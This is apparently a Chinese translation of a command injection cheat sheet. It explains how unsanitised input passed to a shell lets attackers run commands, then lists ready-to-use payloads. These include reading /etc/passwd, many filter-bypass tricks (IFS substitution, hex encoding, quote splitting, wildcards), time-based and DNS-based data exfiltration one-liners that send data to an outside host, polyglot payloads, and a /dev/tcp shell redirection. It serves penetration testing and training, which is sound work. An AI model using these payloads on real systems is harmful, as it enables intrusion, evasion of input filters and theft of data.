# 命令注入

> 命令注入是一种安全漏洞，允许攻击者在易受攻击的应用程序内部执行任意命令。

## 摘要

- 工具
- 利用方法
  - 基本命令
  - 链接命令
  - 命令内部
- 过滤器绕过
  - 无空格绕过
  - 使用换行符绕过
  - 使用反斜杠换行绕过
  - 通过十六进制编码绕过字符过滤器
  - 绕过黑名单词汇
  - 使用单引号绕过
  - 使用双引号绕过
  - 使用反斜杠和斜杠绕过
  - 使用$@绕过
  - 使用$()绕过
  - 使用变量扩展绕过
  - 使用通配符绕过
- 数据泄露
  - 基于时间的数据显示
  - 基于DNS的数据泄露
- 多语言命令注入
- 技巧
  - 后台运行长时间命令
  - 移除注入后的参数
- 实验室
- 挑战
- 参考资料

## 工具

- commixproject/commix - 自动化全能操作系统命令注入和利用工具
- projectdiscovery/interactsh - OOB交互收集服务器和客户端库

## 利用方法

命令注入，也称为shell注入，是一种攻击类型，攻击者可以通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供数据（表单、cookie、HTTP头等）传递给系统shell时，这种漏洞可能存在。在这个上下文中，系统shell是一个处理要执行的命令的命令行界面，通常在Unix或Linux系统上。

命令注入的危险在于，它可能允许攻击者在系统上执行任何命令，可能导致整个系统的妥协。

**PHP命令注入示例**：
假设您有一个PHP脚本，该脚本接受用户输入来ping指定的IP地址或域名：

```php
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

在上面的代码中，PHP脚本使用`system()`函数执行用户通过`ip` GET参数提供的IP地址或域名的`ping`命令。

如果攻击者提供类似`8.8.8.8; cat /etc/passwd`的输入，实际执行的命令将是：`ping -c 4 8.8.8.8; cat /etc/passwd`。

这意味着系统将首先`ping 8.8.8.8`，然后执行`cat /etc/passwd`命令，这将显示`/etc/passwd`文件的内容，可能会泄露敏感信息。

### 基本命令

执行命令，瞧！ :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```

### 链接命令

在许多命令行界面中，特别是在类Unix系统中，有几个字符可以用来链接或操作命令。

- `;`（分号）：允许您顺序执行多个命令。
- `&&`（与）：仅在第一个命令成功（返回零退出状态）时执行第二个命令。
- `||`（或）：仅在第一个命令失败（返回非零退出状态）时执行第二个命令。
- `&`（后台）：在后台执行命令，允许用户继续使用shell。
- `|`（管道）：取第一个命令的输出，并将其用作第二个命令的输入。

```powershell
command1; command2   # 先执行command1，然后执行command2
command1 && command2 # 只有在command1成功时才执行command2
command1 || command2 # 只有在command1失败时才执行command2
command1 & command2  # 在后台执行command1
command1 | command2  # 将command1的输出管道到command2
```

### 命令内部

- 使用反引号进行命令注入。

  ```bash
  original_cmd_by_server `cat /etc/passwd`
  ```

- 使用替换进行命令注入

  ```bash
  original_cmd_by_server $(cat /etc/passwd)
  ```



## 绕过过滤器

### 不使用空格的绕过方法

- `$IFS` 是一个特殊的 shell 变量，称为内部字段分隔符。默认情况下，在许多 shell 中，它包含空白字符（空格、制表符、换行符）。当在命令中使用时，shell 会将 `$IFS` 解释为空格。`$IFS` 不能直接在 `ls`、`wget` 等命令中作为分隔符使用；应使用 `${IFS}` 代替。

  ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```

- 在某些 shell 中，花括号扩展可以生成任意字符串。执行时，shell 会将花括号内的项视为单独的命令或参数。

  ```powershell
  {cat,/etc/passwd}
  ```

- 输入重定向。`<` 字符告诉 shell 读取指定文件的内容。

  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```

- ANSI-C 引用

  ```powershell
  X=$'uname\x20-a'&&$X
  ```

- 制表符有时可以用作空格的替代品。在 ASCII 中，制表符由十六进制值 `09` 表示。

  ```powershell
  ;ls%09-al%09/home
  ```

- 在 Windows 中，`%VARIABLE:~start,length%` 是用于对环境变量进行子字符串操作的语法。

  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```

### 使用换行符绕过

命令也可以使用换行符顺序执行

```bash
服务器原始命令
ls
```

### 使用反斜杠和换行符绕过

- 可以通过使用反斜杠后跟换行符将命令分成多个部分

  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```

- URL 编码的形式如下：

  ```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
  ```

### 通过十六进制编码绕过字符过滤器

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### 绕过字符过滤器

不使用反斜杠和斜杠执行命令 - linux bash

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### 绕过黑名单词汇

#### 使用单引号绕过

```powershell
w'h'o'am'i
```

#### 使用双引号绕过

```powershell
w"h"o"am"i
```

#### 使用反斜杠和斜杠绕过

```powershell
w\ho\am\i
/\b\i
/////s\h
```

#### 使用 $@ 绕过

`$0`：如果作为脚本运行，则指脚本的名称。如果在交互式 shell 会话中，`$0` 通常会给出 shell 的名称。

```powershell
who$@ami
echo whoami|$0
```

#### 使用 $() 绕过

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

#### 使用变量扩展绕过

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### 使用通配符绕过

```powershell
powershell C:\*\*2
??e*d.*? # 记事本
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # 计算器
```

## 数据泄露

### 基于时间的数据泄露

逐个字符提取数据

```powershell
swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```

### 基于 DNS 的数据泄露

基于来自 `https://github.com/HoLyVieR/dnsbin` 的工具，也托管在 dnsbin.zhack.ca

```powershell
1. 访问 http://dnsbin.zhack.ca/
2. 执行一个简单的 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

检查基于 DNS 的数据泄露的在线工具：

- dnsbin.zhack.ca
- pingb.in

## 多语言命令注入

多语言是指一段代码在多个编程语言或环境中同时有效且可执行。当我们谈论“多语言命令注入”时，我们指的是可以在多个上下文或环境中执行的注入负载。

- 示例 1：

  ```powershell
  负载：1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  
  # 单引号和双引号中的命令上下文：
  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  ```

- 示例 2：

  ```powershell
  负载：/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  
  # 单引号和双引号中的命令上下文：
  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
  ```

## 技巧

### 后台运行长时间命令

在某些情况下，您可能有一个长时间运行的命令，由于注入它的进程超时而被杀。
使用 `nohup`，您可以在父进程退出后保持进程运行。

```bash
nohup sleep 120 > /dev/null &
```

### 移除注入后的参数

在类 Unix 命令行界面中，`--` 符号用于表示命令选项的结束。在 `--` 之后，所有参数都被视为文件名和参数，而不是选项。

- 实验室练习：

  - 简单案例的操作系统命令注入：[链接](https://portswigger.net/web-security/os-command-injection/lab-simple)
  - 具有时间延迟的盲操作系统命令注入：[链接](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
  - 具有输出重定向的盲操作系统命令注入：[链接](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
  - 具有带外互动的盲操作系统命令注入：[链接](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
  - 具有带外数据泄露的盲操作系统命令注入：[链接](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

- 挑战题目：基于前面的技巧，以下命令的作用是什么？

  ```powershell
  g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
  ```

- 参考资料：

  - 利用基于时间的RCE：[链接](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
  - Windows RCE无空格漏洞赏金调查：[链接](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
  - 无PHP、无空格、无$、无{ }，仅bash - @asdizzle：[链接](https://twitter.com/asdizzle_/status/895244943526170628)
  - 通过字符串操作进行#bash #混淆 - Malwrologist, @DissectMalware：[https://twitter.com/DissectMalware/status/1025604382644232192](https://twitter.com/DissectMalware/status/1025604382644232192)
  - 什么是操作系统命令注入 - portswigger：[链接](https://portswigger.net/web-security/os-command-injection)
